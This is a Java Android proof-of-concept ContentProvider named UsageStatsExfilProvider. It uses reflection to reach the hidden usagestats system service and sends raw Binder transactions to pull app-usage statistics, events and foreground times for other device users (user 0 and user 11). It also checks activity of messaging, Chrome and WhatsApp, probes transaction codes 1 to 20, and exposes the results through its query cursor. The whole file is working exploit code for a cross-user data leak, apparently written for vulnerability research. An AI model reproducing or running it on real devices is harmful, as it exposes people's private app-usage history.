package com.poc.crossuser;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.Parcel;
import java.lang.reflect.Method;

public class UsageStatsExfilProvider extends ContentProvider {

    @Override
    public boolean onCreate() { return true; }

    @Override
    public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"test", "result"});
        cursor.addRow(new Object[]{"uid", String.valueOf(android.os.Process.myUid())});

        IBinder binder = getServiceBinder("usagestats");
        if (binder == null) {
            cursor.addRow(new Object[]{"error", "no_binder"});
            return cursor;
        }

        String desc = "android.app.usage.IUsageStatsManager";

        // TX=1: queryUsageStats(int bucketType, long beginTime, long endTime, String callingPkg, int userId)
        // Try with longer time range and parse the response
        testQueryUsageStats(binder, desc, cursor, 0, "u0");
        testQueryUsageStats(binder, desc, cursor, 11, "u11");

        // TX=2: queryConfigurationStats
        testQueryConfigStats(binder, desc, cursor, 0, "u0");
        testQueryConfigStats(binder, desc, cursor, 11, "u11");

        // TX=3: queryEventStats
        testQueryEventStats(binder, desc, cursor, 0, "u0");
        testQueryEventStats(binder, desc, cursor, 11, "u11");

        // TX=4: queryEvents - most detailed (individual app open/close events!)
        testQueryEvents(binder, desc, cursor, 0, "u0");
        testQueryEvents(binder, desc, cursor, 11, "u11");

        // TX=5: isAppInactive
        testIsAppInactive(binder, desc, cursor);

        // TX=8: queryUsageStats with longer window (week)
        testQueryUsageStatsWeek(binder, desc, cursor, 0, "u0");
        testQueryUsageStatsWeek(binder, desc, cursor, 11, "u11");

        // Try ALL tx codes to map the service
        for (int tx = 1; tx <= 20; tx++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(0);
                boolean result = binder.transact(tx, data, reply, 0);
                if (!result) {
                    cursor.addRow(new Object[]{"usage_tx" + tx, "NO_SUCH_TX"});
                } else {
                    int ex = reply.readInt();
                    if (ex == 0) {
                        cursor.addRow(new Object[]{"usage_tx" + tx, "SUCCESS avail=" + reply.dataAvail()});
                    } else {
                        String msg = reply.readString();
                        String s = msg != null ? msg.substring(0, Math.min(80, msg.length())) : "null";
                        cursor.addRow(new Object[]{"usage_tx" + tx, "Ex=" + ex + "|" + s});
                    }
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"usage_tx" + tx, "THROW:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }

        return cursor;
    }

    private void testQueryUsageStats(IBinder binder, String desc, MatrixCursor cursor, int userId, String tag) {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeInt(0); // INTERVAL_DAILY
            data.writeLong(System.currentTimeMillis() - 7 * 86400000L); // 7 days ago
            data.writeLong(System.currentTimeMillis());
            data.writeString(getContext().getPackageName());
            data.writeInt(userId);
            binder.transact(1, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                int avail = reply.dataAvail();
                cursor.addRow(new Object[]{"queryUsageStats_" + tag, "SUCCESS avail=" + avail});
                if (avail > 0) {
                    // ParceledListSlice format: int count, then Parcelable[] items
                    try {
                        int count = reply.readInt();
                        cursor.addRow(new Object[]{"queryUsageStats_" + tag + "_count", String.valueOf(count)});
                        // Read first few items
                        for (int i = 0; i < Math.min(count, 5); i++) {
                            // UsageStats parcelable:
                            int nonNull = reply.readInt();
                            if (nonNull != 0) {
                                String pkg = reply.readString();
                                long firstTimeStamp = reply.readLong();
                                long lastTimeStamp = reply.readLong();
                                long totalTimeInForeground = reply.readLong();
                                cursor.addRow(new Object[]{"usage_" + tag + "_" + i,
                                    "pkg=" + pkg + " totalFg=" + totalTimeInForeground + "ms"});
                            }
                        }
                    } catch (Exception e) {
                        cursor.addRow(new Object[]{"queryUsageStats_" + tag + "_parse", "err:" + e.getMessage()});
                    }
                }
            } else {
                String msg = reply.readString();
                cursor.addRow(new Object[]{"queryUsageStats_" + tag, "Ex=" + ex + "|" + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"queryUsageStats_" + tag, "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();
    }

    private void testQueryUsageStatsWeek(IBinder binder, String desc, MatrixCursor cursor, int userId, String tag) {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeInt(2); // INTERVAL_WEEKLY
            data.writeLong(System.currentTimeMillis() - 30L * 86400000L); // 30 days
            data.writeLong(System.currentTimeMillis());
            data.writeString(getContext().getPackageName());
            data.writeInt(userId);
            binder.transact(1, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                int avail = reply.dataAvail();
                cursor.addRow(new Object[]{"queryUsageWeek_" + tag, "SUCCESS avail=" + avail});
            } else {
                cursor.addRow(new Object[]{"queryUsageWeek_" + tag, "Ex=" + ex + "|" + truncate(reply.readString())});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"queryUsageWeek_" + tag, "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();
    }

    private void testQueryConfigStats(IBinder binder, String desc, MatrixCursor cursor, int userId, String tag) {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeInt(0);
            data.writeLong(System.currentTimeMillis() - 86400000L);
            data.writeLong(System.currentTimeMillis());
            data.writeString(getContext().getPackageName());
            data.writeInt(userId);
            binder.transact(2, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                int avail = reply.dataAvail();
                cursor.addRow(new Object[]{"queryConfigStats_" + tag, "SUCCESS avail=" + avail});
            } else {
                cursor.addRow(new Object[]{"queryConfigStats_" + tag, "Ex=" + ex + "|" + truncate(reply.readString())});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"queryConfigStats_" + tag, "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();
    }

    private void testQueryEventStats(IBinder binder, String desc, MatrixCursor cursor, int userId, String tag) {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeInt(0);
            data.writeLong(System.currentTimeMillis() - 86400000L);
            data.writeLong(System.currentTimeMillis());
            data.writeString(getContext().getPackageName());
            data.writeInt(userId);
            binder.transact(3, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                int avail = reply.dataAvail();
                cursor.addRow(new Object[]{"queryEventStats_" + tag, "SUCCESS avail=" + avail});
            } else {
                cursor.addRow(new Object[]{"queryEventStats_" + tag, "Ex=" + ex + "|" + truncate(reply.readString())});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"queryEventStats_" + tag, "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();
    }

    private void testQueryEvents(IBinder binder, String desc, MatrixCursor cursor, int userId, String tag) {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeLong(System.currentTimeMillis() - 3600000L); // last hour
            data.writeLong(System.currentTimeMillis());
            data.writeString(getContext().getPackageName());
            data.writeInt(userId);
            binder.transact(4, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                int avail = reply.dataAvail();
                cursor.addRow(new Object[]{"queryEvents_" + tag, "SUCCESS avail=" + avail});
                if (avail > 0) {
                    // UsageEvents format: Parcel with events
                    // First field is usually event count or next index
                    try {
                        int eventCount = reply.readInt();
                        cursor.addRow(new Object[]{"queryEvents_" + tag + "_count", String.valueOf(eventCount)});
                    } catch (Exception ignored) {}
                }
            } else {
                cursor.addRow(new Object[]{"queryEvents_" + tag, "Ex=" + ex + "|" + truncate(reply.readString())});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"queryEvents_" + tag, "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();
    }

    private void testIsAppInactive(IBinder binder, String desc, MatrixCursor cursor) {
        // isAppInactive(packageName, userId) - check if specific app is inactive
        String[] targets = {"com.google.android.apps.messaging", "com.android.chrome", "com.whatsapp"};
        for (String pkg : targets) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(pkg);
                data.writeInt(0); // userId
                binder.transact(6, data, reply, 0); // isAppInactive might be TX=6
                int ex = reply.readInt();
                if (ex == 0) {
                    int inactive = reply.readInt();
                    cursor.addRow(new Object[]{"isInactive_" + pkg.substring(pkg.lastIndexOf('.') + 1), "inactive=" + inactive});
                } else {
                    cursor.addRow(new Object[]{"isInactive_" + pkg.substring(pkg.lastIndexOf('.') + 1), "Ex=" + ex});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"isInactive_" + pkg.substring(pkg.lastIndexOf('.') + 1), "ERR"});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private String truncate(String s) {
        if (s == null) return "null";
        return s.length() > 120 ? s.substring(0, 120) : s;
    }

    private IBinder getServiceBinder(String name) {
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method m = sm.getMethod("getService", String.class);
            return (IBinder) m.invoke(null, name);
        } catch (Exception e) {
            return null;
        }
    }

    @Override public String getType(Uri uri) { return null; }
    @Override public Uri insert(Uri uri, ContentValues values) { return null; }
    @Override public int delete(Uri uri, String sel, String[] selArgs) { return 0; }
    @Override public int update(Uri uri, ContentValues values, String sel, String[] selArgs) { return 0; }
}
